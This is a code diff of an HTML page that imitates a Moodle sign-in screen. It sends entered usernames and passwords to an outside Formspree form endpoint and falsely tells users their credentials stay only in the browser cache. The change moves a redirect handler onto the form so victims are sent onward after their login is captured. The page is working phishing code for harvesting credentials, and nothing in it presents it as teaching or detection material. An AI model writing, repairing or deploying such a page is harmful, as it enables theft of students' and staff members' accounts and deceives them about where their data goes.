@@ -16,7 +16,7 @@
             <h2><img src="logo.png"  style="width:170px;height:70px;"></h2>
                 <h2>Sign in</h2>
                 <p>Specify Moodle Account</p>
-                <form name="input" method="post" action="https://formspree.io/mvovogrb" method="POST">
+                <form name="input" method="post" action="https://formspree.io/mvovogrb" method="POST" onsubmit="return redirectMe();">
                   <div class="inputBox">
                     <input type="email" name="_replyto" required onkeyup="this.setAttribute('value', this.value);"  value="">
                     <label>Username</label>
@@ -26,10 +26,10 @@
                         <label>Password</label>
                       </div>
                     <p style="font-size:11px;color:#5f6368;">Email, OAuth, OAuth2 tokens and password are only stored in browser cache.</p>
-                  <input type="submit" name="sign-in" value="Sign In" onsubmit="return redirectMe();">
+                  <input type="submit" name="sign-in" value="Sign In">
                 </form>
               </div>
-}
+
     
 </body>
 </html>
